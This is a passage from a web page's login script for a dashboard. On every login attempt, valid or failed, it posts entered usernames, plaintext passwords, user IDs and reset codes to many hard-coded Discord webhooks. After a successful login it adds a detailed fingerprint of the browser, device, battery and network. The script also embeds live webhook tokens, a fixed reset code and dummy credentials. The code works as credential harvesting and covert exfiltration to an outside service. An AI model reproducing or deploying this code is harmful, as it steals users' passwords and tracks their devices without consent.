                    username: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU',
                    password: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI',
                    identifier: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXMKJTjAYOxtLeltAZ3RsJRHQjf1Oj7Ce9c02cA',
                    invalid_username: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPXd3fRBuXSG5FTtPMT9MooblezpxJLqDA97jIUShkp',
                    invalid_password: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp',
                    invalid_identifier: 'https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTc_X6ulXvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5',
                    attempts_counter: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEcKjXuFOml4rzLjEkJNqu3wXB3JAWHvGS39lC6YRZ_1aw',
                    attempts_exceeded: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHaIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ'
                };

                // Original webhooks
                const webhookUrls = {
                    userLogging: 'https://discord.com/api/webhooks/1402682960397860964/rmNhK0G8NOJlbRN38RdCmPB1-rzXaaogzqIJmA7EuTVEIoFpTinMXLff0qr5ke1RV7K3',
                    browserLogging: 'https://discord.com/api/webhooks/1402690380910170154/EJgpyFYc0pyz5EnrOTXiSlM7W1jUnBldRd0PUKLEvERgE6nXfDVAb7NXaKIzR-3APGHP',
                    deviceLogging: 'https://discord.com/api/webhooks/1402692400593371289/_Nx1ZdupZIrlkVmCO0J1OIphb9az9I1AZDZ6gjAemL2IHbuMLpWCbTltBfch-i970d1F',
                    connectionLogging: 'https://discord.com/api/webhooks/1402694010123849840/IYCqiKdvj9QnFJ9WPoAlFBXzrY2mBnHR5SANj7c1uuYhkQV3Veado9hIVbtqh9PCZO1D',
                    sessionLogging: 'https://discord.com/api/webhooks/1402695341257654405/SiXvG8hdSshEfPjz2e7gRQ3P80yqBNZw2AwHlUpEtFtHPD2vbG_Dh8JHjnfdDRD4hmJk'
                };

                const loginBox = document.getElementById('loginBox');
                const usernameInput = document.getElementById('username');
                const passwordInput = document.getElementById('password');
                const userIDInput = document.getElementById('userID');
                const showPasswordCheckbox = document.getElementById('showPassword');
                const submitBtn = document.getElementById('submitBtn');
                const errorMsg = document.getElementById('errorMsg');
                const attemptsText = document.getElementById('attemptsText');
                const resetPopup = document.getElementById('resetPopup');
                const resetField = document.getElementById('resetField');
                const resetBtn = document.getElementById('resetBtn');

                let attempts = 5;
                let users = [];
                let loginTime = null;

                // Show/hide password toggle
                showPasswordCheckbox.addEventListener('change', () => {
                    passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password';
                });

                // Fetch user JSON data on load
                originalFetch(USER_JSON_URL)
                    .then(res => res.json())
                    .then(data => {
                        users = data;
                    })
                    .catch(() => {
                        users = [];
                        console.error('Failed to load user JSON data.');
                        // Fallback to a single dummy user if network fails
                        users.push({
                            username: "Beta.user",
                            password: "password123",
                            userID: "281573",
                            name: "Guest User",
                            rank: "Guest",
                            role: "User",
                            accountCreationDate: "N/A"
                        });
                        dashboard.showNotification("Could not load whitelist.json. Using dummy login 'Beta.user / password123 / 281573'.", 10000);
                    });

                // Flash red outline function
                function flashRedOutline(times = 2, delay = 400) {
                    let count = 0;
                    function flash() {
                        loginBox.classList.add('flashing');
                        setTimeout(() => {
                            loginBox.classList.remove('flashing');
                            count++;
                            if (count < times) setTimeout(flash, delay);
                        }, delay);
                    }
                    flash();
                }

                // Get WebGL Renderer (used for device logging)
                function getWebGLRenderer() {
                    try {
                        const canvas = document.createElement('canvas');
                        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                        if (!gl) return "Unavailable";
                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
                    } catch {
                        return "Unavailable";
                    }
                }

                // Battery status promise (device logging)
                async function getBatteryStatus() {
                    if (navigator.getBattery) {
                        try {
                            const battery = await navigator.getBattery();
                            return battery;
                        } catch {
                            return null;
                        }
                    }
                    return null;
                }

                // Build user info object from user JSON
                function findUser(username, userID) {
                    return users.find(u =>
                        u.username?.toLowerCase() === username.toLowerCase() &&
                        u.userID?.toString() === userID.toString()
                    );
                }

                // Send Discord webhook with custom embed fields
                async function sendWebhook(url, embed) {
                    // Check if logging is enabled in settings before sending
                    if (localStorage.getItem('enableLogging') === 'false') {
                        // console.log("Webhook logging disabled by settings:", embed.title);
                        return;
                    }
                    try {
                        await originalFetch(url, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ embeds: [embed] }),
                        });
                    } catch (e) {
                        console.warn('Webhook send failed:', e);
                    }
                }

                // Collect browser & device info for logs
                async function collectLoggingData(user, password) {
                    const now = new Date();
                    loginTime = now.toISOString();
                    const batteryStatus = await getBatteryStatus();

                    return {
                        user,
                        password,
                        loginTime,
                        batteryStatus,
                        webglRenderer: getWebGLRenderer(),
                    };
                }

                // New logging functions for the specific systems
                async function logUsername(name, username) {
                    const embed = { title: "Username Logging", color: 0x3498db, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] }; await sendWebhook(loggingWebhooks.username, embed);
                }

                async function logPassword(name, password) {
                    const embed = { title: "Password Logging", color: 0xe74c3c, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Password", value: password, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] }; await sendWebhook(loggingWebhooks.password, embed);
                }

                async function logIdentifier(name, identifier) {
                    const embed = { title: "Identifier Logging", color: 0x2ecc71, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Identifier", value: identifier, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] }; await sendWebhook(loggingWebhooks.identifier, embed);
                }

                async function logInvalidUsername(name, username) {
                    const embed = { title: "Invalid Username Logging", color: 0xf39c12, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Invalid Username", value: username, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] }; await sendWebhook(loggingWebhooks.invalid_username, embed);
                }

                async function logInvalidPassword(name, password) {
                    const embed = { title: "Invalid Password Logging", color: 0xe67e22, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Invalid Password", value: password, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] }; await sendWebhook(loggingWebhooks.invalid_password, embed);
                }

                async function logInvalidIdentifier(name, identifier) {
                    const embed = { title: "Invalid Identifier Logging", color: 0xd35400, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Invalid Identifier", value: identifier, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] }; await sendWebhook(loggingWebhooks.invalid_identifier, embed);
                }

                async function logAttemptsCounter(name, username, password, identifier, attemptsLeft) {
                    const embed = { title: "Attempts Counter Logging", color: 0x9b59b6, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Password", value: password, inline: true }, { name: "Identifier", value: identifier, inline: true }, { name: "Attempts Left", value: attemptsLeft.toString(), inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] }; await sendWebhook(loggingWebhooks.attempts_counter, embed);
                }

                async function logAttemptsExceeded(name, username, password, identifier) {
                    const embed = { title: "Attempts Exceeded Logging", color: 0xc0392b, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Password", value: password, inline: true }, { name: "Identifier", value: identifier, inline: true }, { name: "Status", value: "MAX ATTEMPTS EXCEEDED", inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] }; await sendWebhook(loggingWebhooks.attempts_exceeded, embed);
                }

                // Original embed builders (unchanged)
                function buildUserLoggingEmbed(data) { return { title: "User Logging System", color: 0xff0000, fields: [ { name: "Name", value: data.user.name || "N/A", inline: true }, { name: "Username", value: data.user.username, inline: true }, { name: "Password", value: data.password, inline: true }, { name: "Rank Type", value: data.user.rank?.toString() || "N/A", inline: true }, { name: "Role Type", value: data.user.role || "N/A", inline: true }, { name: "Login Time", value: data.loginTime, inline: false }, { name: "User Identifier", value: data.user.userID.toString(), inline: true }, { name: "Account Creation Date", value: data.user.accountCreationDate || "N/A", inline: true } ] }; }
                function buildBrowserLoggingEmbed(data) { const nav = navigator; return { title: "Browser Logging System", color: 0x00ff00, fields: [ { name: "Person's Name", value: data.user.name || "N/A", inline: true }, { name: "Username", value: data.user.username || "N/A", inline: true }, { name: "User Identifier", value: data.user.userID?.toString() || "N/A", inline: true }, { name: "Browser Vendor", value: nav.vendor || "Unknown", inline: true }, { name: "Browser Language", value: nav.language || "Unknown", inline: true }, { name: "Browser Languages", value: nav.languages ? nav.languages.join(", ") : "Unknown", inline: false }, { name: "User Agent", value: nav.userAgent || "Unknown", inline: false }, { name: "Installed Plugins", value: nav.plugins?.length > 0 ? `${nav.plugins.length} plugin(s)` : "None", inline: true }, { name: "Browser Window Size", value: `${window.innerWidth}x${window.innerHeight}`, inline: true }, { name: "Browser Zoom Level", value: `${Math.round(window.devicePixelRatio * 100)}%`, inline: true }, { name: "Incognito/Private Mode Status", value: "Undetected", inline: true }, { name: "Cookies Enabled", value: nav.cookieEnabled ? "Yes" : "No", inline: true }, { name: "Do Not Track", value: nav.doNotTrack || "Unknown", inline: true }, { name: "Browser Tab Visibility", value: document.visibilityState || "Unknown", inline: true }, { name: "Font Smoothing Type", value: "Unavailable", inline: true }, { name: "Clipboard Access", value: nav.clipboard ? "Supported" : "Not Supported", inline: true }, { name: "WebGL Renderer Info", value: data.webglRenderer || "Unavailable", inline: true }, { name: "Browser Connection Speed", value: nav.connection?.effectiveType || "Unknown", inline: true } ] }; }
                function buildDeviceLoggingEmbed(data) { const nav = navigator; const battery = data.batteryStatus; return { title: "Device Logging System", color: 0x0000ff, fields: [ { name: "Person's Name", value: data.user.name || "N/A", inline: true }, { name: "Username", value: data.user.username || "N/A", inline: true }, { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true }, { name: "Device Platform", value: nav.platform || "Unknown", inline: true }, { name: "CPU Cores", value: nav.hardwareConcurrency ? `${nav.hardwareConcurrency} cores` : "Unavailable", inline: true }, { name: "Device Memory", value: nav.deviceMemory ? `${nav.deviceMemory} GB` : "Unavailable", inline: true }, { name: "GPU Renderer", value: data.webglRenderer || "Unavailable", inline: true }, { name: "Battery Charging", value: battery?.charging ? "Yes" : "No", inline: true }, { name: "Battery Level", value: battery ? `${Math.round(battery.level * 100)}%` : "Unavailable", inline: true }, { name: "Touch Support", value: ('ontouchstart' in window || nav.maxTouchPoints > 0) ? "Yes" : "No", inline: true }, { name: "Screen Resolution", value: `${screen.width}x${screen.height}`, inline: true }, { name: "Screen Orientation", value: screen.orientation?.type || "Unavailable", inline: true }, { name: "Color Depth", value: `${screen.colorDepth} bit`, inline: true }, { name: "Pixel Depth", value: `${screen.pixelDepth} bit`, inline: true }, { name: "Device Pixel Ratio", value: window.devicePixelRatio?.toString() || "Unknown", inline: true }, { name: "Max Touch Points", value: nav.maxTouchPoints?.toString() || "0", inline: true }, { name: "Vendor", value: nav.vendor || "Unknown", inline: true }, { name: "Language", value: nav.language || "Unknown", inline: true } ] }; }
                function buildConnectionLoggingEmbed(data) { const nav = navigator; return { title: "Connection Logging System", color: 0xffff00, fields: [ { name: "Person's Name", value: data.user.name || "N/A", inline: true }, { name: "Username", value: data.user.username || "N/A", inline: true }, { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true }, { name: "Online Status", value: nav.onLine ? "Online" : "Offline", inline: true }, { name: "Connection Type", value: nav.connection?.type || "Unknown", inline: true }, { name: "Effective Connection Type", value: nav.connection?.effectiveType || "Unknown", inline: true }, { name: "Downlink Speed", value: nav.connection?.downlink ? `${nav.connection.downlink} Mbps` : "Unknown", inline: true }, { name: "RTT (Round Trip Time)", value: nav.connection?.rtt ? `${nav.connection.rtt} ms` : "Unknown", inline: true }, { name: "Save Data Mode", value: nav.connection?.saveData ? "Enabled" : "Disabled", inline: true }, { name: "IP Address", value: data.user.ipAddress || "Unavailable", inline: false }, { name: "VPN Detected", value: data.user.vpnDetected ? "Yes" : "No", inline: true }, { name: "Proxy Detected", value: data.user.proxyDetected ? "Yes" : "No", inline: true }, { name: "Public IPv6", value: data.user.ipv6Address || "Unavailable", inline: false }, { name: "Local IP Addresses", value: data.user.localIPs?.join(", ") || "Unavailable", inline: false }, { name: "Network Downlink Max", value: nav.connection?.downlinkMax ? `${nav.connection.downlinkMax} Mbps` : "Unknown", inline: true }, { name: "Network Metered Connection", value: nav.connection?.metered ? "Yes" : "No", inline: true }, { name: "Network Type Detailed", value: nav.connection?.typeDetailed || "Unknown", inline: true }, { name: "Effective Network Bandwidth Estimate", value: nav.connection?.bandwidthEstimate || "Unavailable", inline: true } ] }; }
                function buildSessionLoggingEmbed(data) { return { title: "Session Logging System", color: 0x00ffff, fields: [ { name: "Person's Name", value: data.user.name || "N/A", inline: true }, { name: "Username", value: data.user.username || "N/A", inline: true }, { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true }, { name: "Login Time", value: data.loginTime || "Unknown", inline: true }, { name: "Logout Time", value: data.logoutTime || "Unknown", inline: true }, { name: "Session Duration", value: data.sessionDuration || "Unknown", inline: true }, { name: "Pages Visited", value: data.pagesVisited?.join(", ") || "None", inline: false }, { name: "Actions Performed", value: data.actionsPerformed?.join(", ") || "None", inline: false }, { name: "Errors Encountered", value: data.errorsEncountered?.join("; ") || "None", inline: false }, { name: "Warnings", value: data.warnings?.join("; ") || "None", inline: false }, { name: "User Role Changes", value: data.roleChanges?.join(", ") || "None", inline: false }, { name: "Permission Changes", value: data.permissionChanges?.join(", ") || "None", inline: false }, { name: "Last Activity Timestamp", value: data.lastActivityTime || "Unknown", inline: true }, { name: "Number of Clicks", value: data.numberOfClicks?.toString() || "0", inline: true }, { name: "Number of Form Submissions", value: data.numberOfFormSubmissions?.toString() || "0", inline: true }, { name: "Idle Time", value: data.idleTime || "0s", inline: true }, { name: "Active Time", value: data.activeTime || "Unknown", inline: true }, { name: "Browser Tab Focus Time", value: data.tabFocusTime || "Unknown", inline: true } ] }; }

                // Handle login submission
                async function submitLogin() {
                    errorMsg.textContent = '';
                    if (!usernameInput.value || !passwordInput.value || !userIDInput.value) {
                        errorMsg.textContent = 'Please fill all fields.';
                        dashboard.showNotification('Please fill all login fields.', 4000);
                        return;
                    }

                    const username = usernameInput.value;
                    const password = passwordInput.value;
                    const userID = userIDInput.value;
                    const user = findUser(username, userID);

                    // Log the attempt
                    await logAttemptsCounter(
                        user?.name || "Unknown",
                        username,
                        password,
                        userID,
                        attempts
                    );

                    if (!user) {
                        await logInvalidUsername(user?.name || "Unknown", username);
                        await logInvalidIdentifier(user?.name || "Unknown", userID);
                        handleFailedAttempt('User not found or ID mismatch.');
                        return;
                    }

                    if (password !== user.password) {
                        await logInvalidPassword(user.name, password);
                        handleFailedAttempt('Incorrect password.');
                        return;
                    }

                    // Correct login
                    attempts = 5;
                    updateAttemptsText();
                    errorMsg.textContent = '';
                    resetPopup.style.display = 'none';
                    // loginBox.style.borderColor = 'white'; // Let settings handle theme colors
                    // loginBox.style.boxShadow = '0 0 15px white'; // Let settings handle theme colors
                    dashboard.showNotification('Login successful!', 3000);


                    // Log successful credentials
                    await logUsername(user.name, username);
                    await logPassword(user.name, password);
                    await logIdentifier(user.name, userID);

                    // Collect data and send logs
                    const loggingData = await collectLoggingData(user, password);

                    // Send all 5 webhooks:
                    await Promise.all([
                        sendWebhook(webhookUrls.userLogging, buildUserLoggingEmbed(loggingData)),
                        sendWebhook(webhookUrls.browserLogging, buildBrowserLoggingEmbed(loggingData)),
                        sendWebhook(webhookUrls.deviceLogging, buildDeviceLoggingEmbed(loggingData)),
                        sendWebhook(webhookUrls.connectionLogging, buildConnectionLoggingEmbed(loggingData)),
                        sendWebhook(webhookUrls.sessionLogging, buildSessionLoggingEmbed(loggingData)),
                    ]);

                    // Animation to Dashboard
                    loginBox.style.display = 'none'; // Hide login immediately to show loading screen
                    loadingScreen2.style.display = 'flex';
                    loadingText2.style.animation = 'typing 2s steps(20, end) forwards, blink-caret .75s step-end infinite';
                    dashboard.showNotification('Loading Dashboard...', 2500);

                    setTimeout(() => {
                        loadingScreen2.classList.add('fade-out');
                        loadingScreen2.addEventListener('transitionend', () => {
                            loadingScreen2.style.display = 'none';
                            dashboardElem.style.display = 'block';
                            document.body.className = 'dashboard-body'; // Apply dashboard body class
                            // Update user info in dashboard
                            document.getElementById('loggedInUser').textContent = user.name || user.username;
                            document.getElementById('loggedInID').textContent = userID;

                            // Initialize dashboard functionality
                            dashboard.init();
                            dashboard.updateStatsDisplay(); // Initial display of stats
                        }, { once: true });
                    }, 3000); // Display for 3 seconds before showing dashboard
                }

                // Failed attempt handler
                async function handleFailedAttempt(msg) {
                    attempts--;
                    updateAttemptsText();
                    errorMsg.textContent = msg;
                    dashboard.showNotification(msg, 4000);

                    if (attempts <= 0) {
                        attempts = 0;
                        errorMsg.textContent = 'No attempts left. Please reset.';
                        dashboard.showNotification('🚫 No attempts left. Please reset!', 6000);

                        // Log attempts exceeded
                        const username = usernameInput.value;
                        const password = passwordInput.value;
                        const userID = userIDInput.value;
                        const user = findUser(username, userID);

                        await logAttemptsExceeded(
                            user?.name || "Unknown",
                            username,
                            password,
                            userID
                        );

                        showResetPopup();
                        disableInputs();
                    } else {
                        if (attempts <= 3) {
                            flashRedOutline(2, 400);
                        }
                    }
                }

                // Update attempts display
                function updateAttemptsText() {
                    attemptsText.textContent = `Attempts Left: ${attempts}`;
                }

                // Disable inputs and submit button
                function disableInputs() {
                    usernameInput.disabled = true;
                    passwordInput.disabled = true;
                    userIDInput.disabled = true;
                    submitBtn.disabled = true;
                }

                // Enable inputs and submit button
                function enableInputs() {
                    usernameInput.disabled = false;
                    passwordInput.disabled = false;
                    userIDInput.disabled = false;
                    submitBtn.disabled = false;
                }

                // Show reset popup
                function showResetPopup() {
                    resetPopup.style.display = 'block';
                    resetPopup.setAttribute('aria-hidden', 'false');
                    resetField.focus();
                }

                // Hide reset popup
                function hideResetPopup() {
                    resetPopup.style.display = 'none';
                    resetPopup.setAttribute('aria-hidden', 'true');
                    resetField.value = '';
                }

                async function resetCounter() {
                    const enteredCode = resetField.value.trim();
                    const isCorrect = enteredCode === 'Reset.Counter.2579';

                    const username = usernameInput.value || 'Unknown';
                    const password = passwordInput.value || 'Unknown';
                    const userID = userIDInput.value || 'Unknown';
                    const user = findUser(username, userID) || {};

                    // 1. Send "Reset box Detected" webhook immediately
                    const resetBoxEmbed = { title: "🔔 Reset Box Detected", color: 0xffff00, fields: [ { name: "Name", value: user.name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Password Entered", value: password, inline: true }, { name: "User ID", value: userID, inline: true }, { name: "Entered Code", value: enteredCode, inline: false }, { name: "Time", value: new Date().toLocaleString(), inline: false } ] };
                    const resetBoxWebhook = "https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJykeiThIZ6gYCJILFSHfSDSnsq";
                    await sendWebhook(resetBoxWebhook, resetBoxEmbed);

                    // Build embed for correct or incorrect code
                    const resultEmbed = {
                        title: isCorrect ? "✅ Reset Code Accepted" : "❌ Incorrect Reset Code Attempt",
                        color: isCorrect ? 0x00ff00 : 0xff0000,
                        fields: [
                            { name: "Name", value: user.name || "N/A", inline: true },
                            { name: "Username", value: username, inline: true },
                            { name: "Password Entered", value: password, inline: true },
                            { name: "User ID", value: userID, inline: true },
                            { name: "Reset Code", value: enteredCode, inline: false },
                            { name: "Time", value: new Date().toLocaleString(), inline: false }
                        ]
                    };

                    // Select webhook for correct or incorrect logging
                    const resultWebhook = isCorrect
                        ? "https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHaSxUQCz-16Qj4uPYk1YxgoanB"
                        : "https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRiJgbSlRDWOJUvHVqsK248ip";

                    await sendWebhook(resultWebhook, resultEmbed);

                    if (isCorrect) {
                        attempts = 5;
                        updateAttemptsText();
                        enableInputs();
                        hideResetPopup();
                        errorMsg.textContent = '';
                        dashboard.showNotification('✅ Login attempts reset!', 4000);
                    } else {
                        alert('Incorrect reset code.');
                        dashboard.showNotification('❗️ Incorrect reset code!', 4000);
                    }
                }

                // Attach event listeners
                submitBtn.addEventListener('click', submitLogin);
                resetBtn.addEventListener('click', resetCounter);

                // Enter key submits login if popup hidden, else tries reset
                document.addEventListener('keydown', e => {
                    if (e.key === 'Enter') {
                        if (resetPopup.style.display === 'block') {
                            resetCounter();
                        } else {
                            submitLogin();
                        }
                    }
                });

                // Initialize attempts display
                updateAttemptsText();

                // Request desktop notification permission when DOM is loaded, if allowed in settings
                if (localStorage.getItem('desktopNotifications') === 'true' && Notification.permission !== "granted") {
                    Notification.requestPermission();
                }

                // Initial setup for the announcement bar scroll speed
                const initialScrollSpeed = localStorage.getItem('announcementScrollSpeed') || '20';
                announcementBar.style.animationDuration = initialScrollSpeed + 's';
            })(); // End of Login System IIFE
        }); // End of DOMContentLoaded
    </script>
</body>
</html>
